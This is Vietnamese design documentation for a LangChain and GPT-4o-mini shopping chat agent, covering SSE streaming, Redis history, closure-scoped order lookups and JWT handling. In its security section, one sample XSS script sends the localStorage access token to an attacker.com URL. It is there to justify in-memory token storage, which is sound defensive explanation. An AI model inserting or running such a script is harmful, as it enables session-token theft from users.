# Cách hoạt động của AI Agent — Tài liệu chi tiết

> **Cập nhật:** tháng 4 năm 2026 · **Model:** GPT-4o-mini · **Framework:** LangChain 0.2.x

---

## Mục lục

1. [Tổng quan một câu](#1-tổng-quan-một-câu)
2. [Kiến trúc tổng thể](#2-kiến-trúc-tổng-thể)
3. [Các thành phần & vai trò](#3-các-thành-phần--vai-trò)
4. [Luồng xử lý từng bước — Sequence Diagram](#4-luồng-xử-lý-từng-bước--sequence-diagram)
   - 4.1 [Người dùng ẩn danh — Tìm sản phẩm](#41-người-dùng-ẩn-danh--tìm-sản-phẩm)
   - 4.2 [Người dùng đã đăng nhập — Kiểm tra đơn hàng](#42-người-dùng-đã-đăng-nhập--kiểm-tra-đơn-hàng)
   - 4.3 [Hỏi nhiều vòng — Bộ nhớ hội thoại](#43-hỏi-nhiều-vòng--bộ-nhớ-hội-thoại)
5. [Cơ chế SSE Streaming](#5-cơ-chế-sse-streaming)
6. [LangChain Agent — Tool Calling](#6-langchain-agent--tool-calling)
7. [Bộ nhớ hội thoại (Redis)](#7-bộ-nhớ-hội-thoại-redis)
8. [Mô hình bảo mật](#8-mô-hình-bảo-mật)
9. [Frontend — React Integration](#9-frontend--react-integration)
10. [Xử lý lỗi & Edge Cases](#10-xử-lý-lỗi--edge-cases)
11. [Cấu trúc file](#11-cấu-trúc-file)

---

## 1. Tổng quan một câu

> Người dùng gõ câu hỏi vào popup chat → FastAPI nhận, xác thực JWT (tùy chọn) → LangChain AgentExecutor quyết định gọi tool nào → tool truy vấn Elasticsearch / PostgreSQL / Redis → GPT-4o-mini tổng hợp và **stream từng token** về trình duyệt qua SSE.

---

## 2. Kiến trúc tổng thể

```
┌──────────────────────────────────────────────────────────────────────────────┐
│  TRÌNH DUYỆT (React 18 + Material UI)                                        │
│                                                                              │
│   authStore.js ──────────────────────────────────────────────────────────┐   │
│   (accessToken in-memory, refreshToken in localStorage)                  │   │
│                                                                          │   │
│   chatStore.js ─────────────────────────────────────────────────────┐   │   │
│   (messages[], isLoading, conversationId = crypto.randomUUID())     │   │   │
│                                                                     │   │   │
│   ChatPopup.jsx                                                     │   │   │
│   ┌────────────────────────────────────────────────────────────┐   │   │   │
│   │  [FAB 💬] → popup mở                                       │   │   │   │
│   │  Người dùng gõ → handleSend()                              │◄──┘   │   │
│   │  streamChat(message, { token, conversationId })            │◄──────┘   │
│   │    │                                                        │           │
│   │    │  native fetch + AbortController                        │           │
│   │    │  POST /api/v1/agent/chat                               │           │
│   │    │  Authorization: Bearer <accessToken>  (nếu có)        │           │
│   │    │  Body: { message, conversation_id }                    │           │
│   │    │                                                        │           │
│   │    └── SSE stream về ──────────────────────────────────────┘           │
│   │        on_token     → appendToLast(token)  → text xuất hiện từng chữ   │
│   │        on_tool_start→ addMessage('tool', name) → chip 🔍               │
│   │        on_done      → finishStreaming()                                 │
│   └────────────────────────────────────────────────────────────┘           │
└──────────────────────────────────────────────────────────────────────────────┘
                                │ HTTPS POST
                                ▼
┌──────────────────────────────────────────────────────────────────────────────┐
│  Nginx Reverse Proxy (:3000)  →  /api/*  forward → FastAPI (:8001)           │
└──────────────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌──────────────────────────────────────────────────────────────────────────────┐
│  FastAPI (:8001)  —  fast_api_services/                                      │
│                                                                              │
│  routers/agent.py                                                            │
│  ┌──────────────────────────────────────────────────────────────────────┐   │
│  │  POST /api/v1/agent/chat                                             │   │
│  │                                                                      │   │
│  │  1. Kiểm tra OPENAI_API_KEY → 503 nếu thiếu                         │   │
│  │  2. HTTPBearer(auto_error=False) → decode JWT → user_id (int | None) │   │
│  │  3. Mở AsyncSession (PostgreSQL)                                     │   │
│  │  4. Gọi stream_agent_response(...)                                   │   │
│  │  5. StreamingResponse(media_type="text/event-stream")                │   │
│  └──────────────────────────────┬───────────────────────────────────────┘   │
│                                 │                                            │
│  services/agent_service.py      │                                            │
│  ┌──────────────────────────────▼───────────────────────────────────────┐   │
│  │  stream_agent_response()                                             │   │
│  │                                                                      │   │
│  │  • load_history(redis, conv_id)  ← Redis                            │   │
│  │  • Chọn executor:                                                    │   │
│  │      user_id = None → singleton anon executor                       │   │
│  │                           tools=[search_products]                   │   │
│  │      user_id = 17   → per-request executor                          │   │
│  │                           tools=[search_products, get_order_status] │   │
│  │  • executor.astream_events(version="v1")                            │   │
│  │      on_tool_start → yield SSE tool_start event                     │   │
│  │      on_chat_model_stream → yield SSE token event                   │   │
│  │  • save_history(redis, conv_id, updated_history)                    │   │
│  └──────┬────────────────────┬──────────────┬────────────────────────────┘   │
│         │                    │              │                                │
│         ▼                    ▼              ▼                                │
│   Elasticsearch 8.11    PostgreSQL 15    Redis                               │
│   (search_products)     (get_order_status)  (chat history)                  │
└──────────────────────────────────────────────────────────────────────────────┘
```

---

## 3. Các thành phần & vai trò

| Thành phần | File | Vai trò |
|---|---|---|
| **Chat Router** | `fast_api_services/routers/agent.py` | Nhận HTTP request, decode JWT tùy chọn, trả SSE stream |
| **Agent Service** | `fast_api_services/services/agent_service.py` | LangChain executor, tools, streaming logic |
| **Memory Service** | `fast_api_services/services/memory_service.py` | Load / save lịch sử hội thoại từ Redis |
| **Request Schema** | `fast_api_services/schemas/agent.py` | Pydantic validation (`message` 1–2000 chars) |
| **Agent API client** | `frontend/src/api/agent.js` | `fetch` + `ReadableStream` SSE parser |
| **Chat UI** | `frontend/src/components/ChatPopup.jsx` | Popup, message bubbles, streaming cursor |
| **Chat Store** | `frontend/src/store/chatStore.js` | Zustand: messages, loading, conversationId |
| **Auth Store** | `frontend/src/store/authStore.js` | Zustand: accessToken (in-memory), refreshToken |

### Tại sao 2 executor thay vì 1?

```
Singleton executor (ẩn danh)          Per-request executor (đã đăng nhập)
────────────────────────────────       ─────────────────────────────────────
Tạo 1 lần khi khởi động app           Tạo mới cho mỗi request
Tools: [search_products]               Tools: [search_products, order_tool]
order_tool KHÔNG có trong list         order_tool CÓ user_id hardcode trong closure
An toàn chia sẻ giữa n requests        Không được share (có state của 1 user cụ thể)
```

---

## 4. Luồng xử lý từng bước — Sequence Diagram

### 4.1 Người dùng ẩn danh — Tìm sản phẩm

```
Người dùng          ChatPopup.jsx         agent.js          FastAPI           LangChain          Elasticsearch
    │                    │                    │                 │                  │                   │
    │  gõ "tai nghe"     │                    │                 │                  │                   │
    │──────────────────► │                    │                 │                  │                   │
    │                    │  handleSend()      │                 │                  │                   │
    │                    │  addMessage('user')│                 │                  │                   │
    │                    │  addMessage('assistant','') ← placeholder rỗng         │                   │
    │                    │  setLoading(true)  │                 │                  │                   │
    │                    │                    │                 │                  │                   │
    │                    │  streamChat(msg, {token: null, conversationId})         │                   │
    │                    │──────────────────► │                 │                  │                   │
    │                    │                    │ POST /agent/chat│                  │                   │
    │                    │                    │ Body: {message, │                  │                   │
    │                    │                    │  conversation_id}                  │                   │
    │                    │                    │────────────────►│                  │                   │
    │                    │                    │                 │                  │                   │
    │                    │                    │                 │ credentials=None │                   │
    │                    │                    │                 │ user_id=None     │                   │
    │                    │                    │                 │                  │                   │
    │                    │                    │                 │ load_history(redis, conv_id)         │
    │                    │                    │                 │──────────────────►│                  │
    │                    │                    │                 │                  │ → []              │
    │                    │                    │                 │                  │                   │
    │                    │                    │                 │ anon_executor.astream_events(v1)      │
    │                    │                    │                 │──────────────────►│                  │
    │                    │                    │                 │                  │                   │
    │                    │                    │                 │                  │ GPT-4o-mini đọc msg│
    │                    │                    │                 │                  │ → gọi search_products│
    │                    │                    │                 │                  │────────────────────►│
    │                    │                    │                 │                  │                   │ ES search
    │                    │                    │                 │                  │                   │ "tai nghe"
    │                    │                    │                 │                  │◄────────────────────│
    │                    │                    │                 │                  │ hits: 5 sản phẩm  │
    │                    │                    │                 │                  │                   │
    │                    │  ─── SSE: tool_start ─────────────────────────────────────────────────────►
    │                    │◄─── data: {"type":"tool_start","tool":"search_products"}                    │
    │  chip 🔍 hiện ra   │                    │                 │                  │                   │
    │                    │                    │                 │                  │                   │
    │                    │  ─── SSE: token ×N ───────────────────────────────────────────────────────►
    │                    │◄─── data: {"type":"token","token":"Dưới"}               │                   │
    │  "Dưới" xuất hiện  │◄─── data: {"type":"token","token":" đây"}              │                   │
    │  " đây" tiếp theo  │◄─── data: {"type":"token","token":" là..."}            │                   │
    │  ...streaming...   │     (nhiều lần)    │                 │                  │                   │
    │                    │                    │                 │                  │                   │
    │                    │◄─── data: [DONE]   │                 │                  │                   │
    │                    │                    │                 │ save_history(redis, conv_id, history) │
    │                    │  finishStreaming()  │                 │                  │                   │
    │  cursor ▋ tắt      │  setLoading(false) │                 │                  │                   │
```

---

### 4.2 Người dùng đã đăng nhập — Kiểm tra đơn hàng

```
Người dùng          ChatPopup.jsx         agent.js          FastAPI           LangChain          PostgreSQL
    │                    │                    │                 │                  │                   │
    │  "đơn hàng         │                    │                 │                  │                   │
    │  a1b2-... ở đâu?"  │                    │                 │                  │                   │
    │──────────────────► │                    │                 │                  │                   │
    │                    │  token=accessToken │                 │                  │                   │
    │                    │──────────────────► │                 │                  │                   │
    │                    │                    │ POST /agent/chat│                  │                   │
    │                    │                    │ Authorization:  │                  │                   │
    │                    │                    │  Bearer eyJ...  │                  │                   │
    │                    │                    │────────────────►│                  │                   │
    │                    │                    │                 │                  │                   │
    │                    │                    │                 │ jwt.decode(token)│                   │
    │                    │                    │                 │ → user_id = 17   │                   │
    │                    │                    │                 │                  │                   │
    │                    │                    │                 │ make_order_status_tool(user_id=17, db)│
    │                    │                    │                 │ → closure captures user_id=17         │
    │                    │                    │                 │                  │                   │
    │                    │                    │                 │ per_request_executor.astream_events() │
    │                    │                    │                 │──────────────────►│                  │
    │                    │                    │                 │                  │ GPT-4o-mini thấy  │
    │                    │                    │                 │                  │ 2 tools, chọn     │
    │                    │                    │                 │                  │ get_order_status  │
    │                    │                    │                 │                  │                   │
    │                    │◄─── tool_start: "get_order_status"  │                  │                   │
    │  chip 🔍 hiện ra   │                    │                 │                  │                   │
    │                    │                    │                 │                  │ Validate UUID     │
    │                    │                    │                 │                  │ SELECT Order      │
    │                    │                    │                 │                  │ WHERE id='a1b2...'│
    │                    │                    │                 │                  │  AND user_id=17   │
    │                    │                    │                 │                  │──────────────────►│
    │                    │                    │                 │                  │◄──────────────────│
    │                    │                    │                 │                  │ order + items     │
    │                    │                    │                 │                  │                   │
    │                    │◄─── SSE tokens: "Order a1b2… — Status: Shipped..."     │                   │
    │  câu trả lời       │                    │                 │                  │                   │
    │  xuất hiện dần     │                    │                 │                  │                   │
    │                    │◄─── [DONE]         │                 │                  │                   │
```

**Điểm mấu chốt về bảo mật:** `user_id=17` được capture vào closure tại thời điểm `make_order_status_tool` được gọi. Dù LLM có muốn truyền `user_id=999` (của người khác), nó không có tham số đó — SQL query luôn `AND user_id=17`.

---

### 4.3 Hỏi nhiều vòng — Bộ nhớ hội thoại

```
Lần 1 (conv_id = "abc-123"):
  User: "tai nghe Sony giá bao nhiêu?"
  Agent: "Sony WH-1000XM5 — $299, Sony WF-1000XM4 — $199"
  
  Redis SET "chat_history:abc-123" = [
    {"role":"human","content":"tai nghe Sony giá bao nhiêu?"},
    {"role":"ai","content":"Sony WH-1000XM5 — $299, Sony WF-1000XM4 — $199"}
  ]
  TTL = 3600 giây

Lần 2 (cùng conv_id = "abc-123"):
  User: "cái đầu tiên có còn hàng không?"

  load_history(redis, "abc-123") → 2 messages từ lần 1
  
  Gửi vào LLM:
    system: "You are a helpful ecommerce assistant..."
    human:  "tai nghe Sony giá bao nhiêu?"       ← lịch sử
    ai:     "Sony WH-1000XM5 — $299..."          ← lịch sử
    human:  "cái đầu tiên có còn hàng không?"    ← câu mới
  
  LLM hiểu "cái đầu tiên" = Sony WH-1000XM5
  Gọi search_products("Sony WH-1000XM5") → stock = 10 → "còn hàng"

  Redis SET "chat_history:abc-123" = [
    ... lần 1 ...
    {"role":"human","content":"cái đầu tiên có còn hàng không?"},
    {"role":"ai","content":"Sony WH-1000XM5 hiện còn 10 sản phẩm..."}
  ]
  Nếu > 10 messages: tự động trim, giữ 5 turns gần nhất
```

---

## 5. Cơ chế SSE Streaming

### Định dạng sự kiện (W3C Server-Sent Events)

Mỗi sự kiện là một dòng text kết thúc bằng hai newline `\n\n`:

```
data: <JSON payload>\n\n
```

### Bảng các loại sự kiện

| Event | Payload JSON | Khi nào |
|---|---|---|
| `token` | `{"type":"token","token":"Hello"}` | LLM sinh ra một fragment câu trả lời |
| `tool_start` | `{"type":"tool_start","tool":"search_products"}` | Agent quyết định gọi tool |
| `error` | `{"type":"error","error":"..."}` | Lỗi phía server trong quá trình stream |
| `[DONE]` | `data: [DONE]` (không phải JSON) | Stream kết thúc hoàn toàn |

### Ví dụ luồng sự kiện thực tế

```
data: {"type":"tool_start","tool":"search_products"}

data: {"type":"token","token":"D\u01b0\u1edbi \u0111\u00e2y l\u00e0 "}

data: {"type":"token","token":"m\u1ed9t s\u1ed1 "}

data: {"type":"token","token":"tai nghe ph\u00f9 h\u1ee3p:\n\n"}

data: {"type":"token","token":"**Sony WH-1000XM5**"}

data: {"type":"token","token":" \u2014 $299"}

data: [DONE]
```

### Xử lý buffer client-side

```javascript
// agent.js
const reader = resp.body.getReader();
const decoder = new TextDecoder();
let buffer = '';

while (true) {
    const { done, value } = await reader.read();
    if (done) break;

    buffer += decoder.decode(value, { stream: true });
    const lines = buffer.split('\n');
    buffer = lines.pop(); // giữ dòng cuối chưa đầy đủ

    for (const line of lines) {
        if (!line.startsWith('data: ')) continue;
        const payload = line.slice(6).trim();

        if (payload === '[DONE]') { onDone?.(); return; }

        const event = JSON.parse(payload);
        if (event.type === 'token')      onToken?.(event.token);
        if (event.type === 'tool_start') onToolStart?.(event.tool);
        if (event.type === 'error')      onError?.(event.error);
    }
}
```

**Tại sao dùng `fetch` thay vì Axios?** Axios không hỗ trợ `ReadableStream` — không thể đọc SSE từng token. Native `fetch` + `getReader()` là cách duy nhất.

**Header bắt buộc cho Nginx:**
```python
headers={
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no',   # ← quan trọng: tắt buffer của Nginx
}
```
Nếu thiếu `X-Accel-Buffering: no`, Nginx sẽ buffer toàn bộ response và gửi một lần — mất tác dụng streaming.

---

## 6. LangChain Agent — Tool Calling

### System Prompt

```python
_SYSTEM_PROMPT = """You are a helpful ecommerce assistant for our online store.

You can help customers with:
- Finding and comparing products — use search_products whenever user asks about products.
- Checking their own order status — use get_order_status when user asks about an order.
- Store policies:
    • Return: 30-day returns (unused, original packaging).
    • Shipping: free over $50; otherwise flat $5.
    • Payment: credit card, PayPal, mock mode.

Rules:
- Always use search_products before answering product questions.
- Always show product name and price.
- Never fabricate information.
"""
```

Prompt được nhúng vào đầu **mỗi cuộc hội thoại** qua `ChatPromptTemplate`:

```python
_prompt = ChatPromptTemplate.from_messages([
    ('system', _SYSTEM_PROMPT),
    MessagesPlaceholder('chat_history', optional=True),  # ← lịch sử hội thoại
    ('human', '{input}'),                                 # ← câu hỏi hiện tại
    MessagesPlaceholder('agent_scratchpad'),              # ← LangChain scratchpad
])
```

### Tool 1: `search_products` — Tìm kiếm Elasticsearch

```
LLM quyết định gọi: search_products(query="tai nghe bluetooth")
                          │
                          ▼
elasticsearch_client.search(
    index="products",
    query={
        "multi_match": {
            "query": "tai nghe bluetooth",
            "fields": ["name^3", "category_name^2", "description"]
        }
    },
    size=5
)
                          │
                          ▼
Trả về (string):
"• Sony WH-1000XM5 — $299 (in stock, ID: 42)
 • JBL Tune 760NC — $79 (in stock, ID: 17)
 • ..."
```

- `name^3` → tên sản phẩm được boost gấp 3 lần so với description.
- `_id` được lấy từ `h['_id']` (không phải `h['_source']['id']`).
- Kết quả trả về dạng **plain string** — LLM đọc và diễn đạt lại bằng ngôn ngữ tự nhiên.

### Tool 2: `get_order_status` — Closure Factory

```python
def make_order_status_tool(user_id: int, db: AsyncSession) -> BaseTool:
    # user_id được CAPTURE tại đây — cố định cho lifetime của tool này
    
    @tool
    async def get_order_status(order_id: str) -> str:
        # Bước 1: Validate UUID format (trả về hướng dẫn nếu sai)
        oid = UUID(order_id.strip())
        
        # Bước 2: Query với BOTH conditions (user_id cố định từ closure)
        result = await db.execute(
            select(Order)
            .where(Order.id == oid, Order.user_id == user_id)  # ← bảo mật
        )
        
        # Bước 3: Lấy items
        items_result = await db.execute(
            select(OrderItem, Product)
            .join(Product, OrderItem.product_id == Product.id)
            .where(OrderItem.order_id == oid)
        )
        
        # Bước 4: Format output
        return f"Order {str(oid)[:8]}… — Status: Shipped\nItems: ..."
    
    return get_order_status
```

### So sánh chiến lược Executor

| | Singleton (ẩn danh) | Per-request (đã đăng nhập) |
|---|---|---|
| Khởi tạo | 1 lần khi app start | Mỗi request mới |
| Tools | `[search_products]` | `[search_products, order_tool]` |
| `order_tool` | Không có | Có, `user_id` hardcode |
| Share giữa requests | ✅ An toàn | ❌ Không được (có state) |
| Chi phí khởi tạo | O(1) | ~vài ms mỗi request |

### LLM & Prompt là Singleton (stateless)

```python
_llm: ChatOpenAI | None = None   # lazy init, tốn kém, stateless → share được

def _get_llm() -> ChatOpenAI:
    global _llm
    if _llm is None:
        _llm = ChatOpenAI(
            model='gpt-4o-mini',
            temperature=0,    # không ngẫu nhiên → kết quả nhất quán
            streaming=True,
            api_key=api_key
        )
    return _llm
```

`ChatOpenAI` không lưu state hội thoại — an toàn hoàn toàn để chia sẻ.

---

## 7. Bộ nhớ hội thoại (Redis)

### Redis Key Schema

```
chat_history:{conversation_id}
  Kiểu: String (JSON array)
  TTL:  3600 giây (1 giờ) — stale conversations tự xóa
  
  Nội dung:
  [
    {"role": "human", "content": "tai nghe Sony giá bao nhiêu?"},
    {"role": "ai",    "content": "Sony WH-1000XM5 — $299..."},
    {"role": "human", "content": "cái đầu tiên còn hàng không?"},
    {"role": "ai",    "content": "Còn 10 sản phẩm..."}
  ]
```

### Giới hạn lịch sử

```python
MAX_HISTORY_TURNS = 5   # giữ 5 cặp human+ai = 10 messages

# Khi save:
max_messages = MAX_HISTORY_TURNS * 2  # = 10
if len(records) > max_messages:
    records = records[-max_messages:]  # trim từ đầu
```

**Tại sao giới hạn?** Gửi quá nhiều lịch sử vào LLM tốn token, tăng chi phí và làm chậm response.

### conversation_id — Vòng đời

```
Trang mở lần đầu:
  chatStore.conversationId = crypto.randomUUID()  ← e.g. "f47ac10b-58cc-4372-a567-..."

Mỗi request:
  POST /agent/chat → body.conversation_id = "f47ac10b-..."
  Backend: load_history(redis, "f47ac10b-...") → danh sách messages cũ
           ... run agent ...
           save_history(redis, "f47ac10b-...", updated_history)

Xóa chat:
  clearMessages() → conversationId = crypto.randomUUID()  ← UUID mới, lịch sử cũ orphan trên Redis
  (lịch sử cũ tự xóa sau TTL = 1 giờ)

Tab đóng / reload:
  chatStore không persist → conversationId mới → conversation mới
```

### Sơ đồ memory_service.py

```
load_history(redis, conversation_id)
    │
    ├── GET "chat_history:{conversation_id}"
    │
    ├── Nếu key không tồn tại → return []
    │
    └── Nếu tồn tại:
        json.loads(raw) → iterate records
        role="human" → HumanMessage(content=...)
        role="ai"    → AIMessage(content=...)
        role=khác    → bỏ qua (forward-compatible)
        return list[BaseMessage]

save_history(redis, conversation_id, history, ttl=3600)
    │
    ├── Filter: chỉ HumanMessage và AIMessage
    │
    ├── Trim: nếu > MAX_HISTORY_TURNS * 2 → giữ phần cuối
    │
    └── SET "chat_history:{conversation_id}" = json.dumps(records) EX ttl
```

---

## 8. Mô hình bảo mật

### Bảng mối đe dọa & biện pháp

| Mối đe dọa | Vector tấn công | Biện pháp |
|---|---|---|
| Truy cập đơn hàng của người khác | Truyền UUID đơn hàng khác | Closure: `AND user_id={user_id}` cứng trong SQL |
| Prompt injection | Gửi `max_length=2000` chars chứa instruction độc hại | `max_length=2000` cắt input; LLM không có quyền thực thi code |
| XSS đánh cắp token | Script inject đọc localStorage | `accessToken` chỉ lưu in-memory Zustand, không bao giờ ở localStorage |
| Brute-force API | Gửi hàng nghìn requests | Rate limiting FastAPI middleware + Nginx `auth` zone (5 req/min/IP) |
| JWT giả mạo | Tạo token với user_id tùy ý | HS256 với `SECRET_KEY` chia sẻ, validate đầy đủ |
| Token hết hạn làm crash | Expired JWT gửi đến agent | `auto_error=False` → token hết hạn = anonymous, không raise 401 |
| OPENAI_API_KEY bị lộ | Commit `.env` vào git | `.gitignore` exclude `.env`, kiểm tra trong router |
| Connection leak | DB session không đóng khi lỗi | `async with AsyncSessionLocal() as db:` → auto-close |

### Luồng xác thực chi tiết

```
Request đến /agent/chat
        │
        ├── Header: "Authorization: Bearer eyJ..."
        │       │
        │       ▼
        │   HTTPBearer(auto_error=False)
        │   jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        │       │
        │       ├── Thành công → payload["sub"] = "17" → user_id = 17
        │       ├── JWTError (hết hạn / sai sig) → user_id = None
        │       └── ValueError (sub không phải số) → user_id = None
        │
        └── Không có header
                │
                ▼
            credentials = None → user_id = None
```

Thiết kế `auto_error=False` có nghĩa: **JWT không hợp lệ không bao giờ trả về 401**. Thay vào đó, request được xử lý ở chế độ ẩn danh (chỉ có `search_products`). Người dùng vẫn nhận được câu trả lời hữu ích.

### Tại sao `accessToken` không lưu localStorage?

```
Nếu lưu localStorage:
  ┌─── Trang web bị XSS injection ───────────────────────────────┐
  │   <script>                                                    │
  │     fetch('https://attacker.com/steal?t=' +                   │
  │           localStorage.getItem('accessToken'));               │
  │   </script>                                                   │
  └───────────────────────────────────────────────────────────────┘
  → Kẻ tấn công có JWT → gọi API tùy ý trong 10 phút (ACCESS_TOKEN_EXPIRE_MINUTES)

Thiết kế hiện tại (in-memory):
  accessToken sống trong biến JavaScript của Zustand store
  → Script từ domain khác KHÔNG THỂ đọc (Same-Origin Policy)
  → Tab đóng → accessToken mất
  → refreshToken (localStorage) chỉ dùng để lấy accessToken mới
     khi app mount lại — không đủ để gọi API trực tiếp
```

---

## 9. Frontend — React Integration

### Cấu trúc ChatPopup.jsx

```
<App>
  ...
  <ChatPopup />   ← luôn được mount, chỉ visible khi isOpen=true
</App>

ChatPopup structure:
  <Fab>              ← nút 💬 góc dưới phải, luôn hiển thị
  <Paper>            ← popup (display: none khi isOpen=false)
    <Header>         ← gradient cam, tên "AI Assistant", nút close
    <ScrollBox>      ← danh sách messages
      <MessageBubble role="assistant">  ← tin nhắn bot (trái, trắng)
      <MessageBubble role="user">       ← tin nhắn user (phải, cam)
      <MessageBubble role="tool">       ← chip 🔍 Searching...
    </ScrollBox>
    <Divider />
    <InputRow>       ← TextField + IconButton Send
  </Paper>
```

### State machine của một request

```
Idle
  │ user nhấn Enter
  ▼
addMessage('user', text)           → bubble user xuất hiện
addMessage('assistant', '')        → bubble bot rỗng (placeholder)
setLoading(true)
  │
  ▼
streamChat() ─── kết nối SSE
  │
  ├── onToolStart(tool) → addMessage('tool', tool)   → chip 🔍 hiện
  │
  ├── onToken(t) → appendToLast(t)    ← Zustand update → React re-render
  │                                      text xuất hiện từng ký tự
  │                                      cursor ▋ nhấp nháy (CSS animation)
  │
  ├── onDone() → finishStreaming()    → cursor ▋ tắt
  │              setLoading(false)
  │
  └── onError(err) → appendToLast('⚠️ ' + err)
                     finishStreaming()
                     setLoading(false)
  │
  ▼
Idle (sẵn sàng nhận tin tiếp theo)
```

### Markdown renderer (inline, không cần thư viện)

```javascript
// Hỗ trợ: **bold**, *italic*, bullet lines (• hoặc -)
function renderMarkdown(text) {
    return text.split('\n').map((line, i) => {
        if (line.trim() === '') return <Box sx={{ height: '0.35em' }} />;
        
        const isBullet = /^[•\-]\s/.test(line);
        const content = parseInline(isBullet ? line.replace(/^[•\-]\s/, '') : line);
        
        if (isBullet) return (
            <Box display="flex" gap={0.75}>
                <span>•</span>
                <span>{content}</span>
            </Box>
        );
        return <Box>{content}</Box>;
    });
}
```

---

## 10. Xử lý lỗi & Edge Cases

### Bảng xử lý lỗi

| Tình huống | Điểm phát sinh | Xử lý |
|---|---|---|
| `OPENAI_API_KEY` chưa set | Router, đầu request | HTTP 503 + JSON message rõ ràng |
| JWT hết hạn | Router, decode token | `user_id = None` → chạy tiếp ở chế độ ẩn danh |
| JWT sai format | Router, decode token | `user_id = None` → chạy tiếp ở chế độ ẩn danh |
| UUID đơn hàng sai format | Tool `get_order_status` | Trả về string hướng dẫn thân thiện |
| UUID đúng nhưng không thuộc user | Tool `get_order_status` | "No order found on your account" |
| Elasticsearch không khả dụng | Tool `search_products` | "Product search temporarily unavailable" |
| Lỗi giữa chừng trong stream | `stream_agent_response` | Yield `{"type":"error",...}` rồi `[DONE]` |
| Redis không khả dụng | `load_history` / `save_history` | Bắt exception → log warning → tiếp tục (best-effort) |
| LLM vượt max_iterations=5 | AgentExecutor | Dừng và trả về câu trả lời hiện có |
| User đóng tab giữa stream | `AbortController.abort()` | Stream bị hủy, không có lỗi hiển thị |
| Input rỗng | Pydantic `min_length=1` | HTTP 422 Unprocessable Entity |
| Input > 2000 ký tự | Pydantic `max_length=2000` | HTTP 422 Unprocessable Entity |

---

## 11. Cấu trúc file

```
fast_api_services/
├── routers/
│   └── agent.py                ← HTTP endpoint
│                                  • Optional JWT auth
│                                  • AsyncSession lifetime management
│                                  • StreamingResponse + SSE headers
│
├── services/
│   ├── agent_service.py        ← LangChain core
│   │                              • System prompt
│   │                              • Tool: search_products (@tool, stateless)
│   │                              • Tool factory: make_order_status_tool (closure)
│   │                              • LLM singleton, Prompt singleton
│   │                              • Executor strategy (anon singleton / per-request)
│   │                              • stream_agent_response() → AsyncIterator[str]
│   │
│   └── memory_service.py       ← Redis conversation memory
│                                  • load_history(redis, conv_id) → list[BaseMessage]
│                                  • save_history(redis, conv_id, history, ttl)
│                                  • MAX_HISTORY_TURNS = 5
│                                  • CHAT_HISTORY_TTL = 3600s
│
├── schemas/
│   └── agent.py                ← Pydantic request model
│                                  • message: str (1–2000 chars)
│                                  • conversation_id: Optional[str] (≤64 chars)
│
└── tests/
    └── test_memory_service.py  ← 11 unit tests (fakeredis, no real Redis needed)

frontend/src/
├── api/
│   └── agent.js                ← SSE streaming client
│                                  • streamChat(message, callbacks) → abort fn
│                                  • native fetch + ReadableStream
│                                  • line-buffer SSE parser
│
├── components/
│   └── ChatPopup.jsx           ← Chat UI
│                                  • FAB trigger
│                                  • MessageBubble (user / assistant / tool)
│                                  • Inline markdown renderer
│                                  • Streaming cursor animation
│
└── store/
    ├── chatStore.js            ← Zustand chat state
    │                              • messages[], isLoading, conversationId
    │                              • addMessage, appendToLast, finishStreaming
    │
    └── authStore.js            ← Zustand auth state
                                   • accessToken (in-memory only)
                                   • refreshToken (localStorage)
```

---

## Tóm tắt — Điểm cốt lõi cần nhớ

| # | Điểm quan trọng | Giải thích |
|---|---|---|
| 1 | **Closure tool** | `make_order_status_tool(user_id, db)` → `user_id` bất biến, không thể bypass |
| 2 | **Optional auth** | `HTTPBearer(auto_error=False)` → JWT không hợp lệ = ẩn danh, không crash |
| 3 | **Singleton strategy** | LLM + Prompt + anon executor là singleton; order tool là per-request |
| 4 | **SSE streaming** | `fetch` + `getReader()`, không dùng Axios; `X-Accel-Buffering: no` cho Nginx |
| 5 | **Best-effort memory** | Lỗi Redis history không fail request — chỉ log warning |
| 6 | **accessToken in-memory** | Không bao giờ lưu localStorage — chống XSS |
| 7 | **conversation_id** | `crypto.randomUUID()` phía client, reset khi xóa chat |
| 8 | **DB session lifecycle** | `async with AsyncSessionLocal() as db:` trong generator — auto-close khi stream xong |
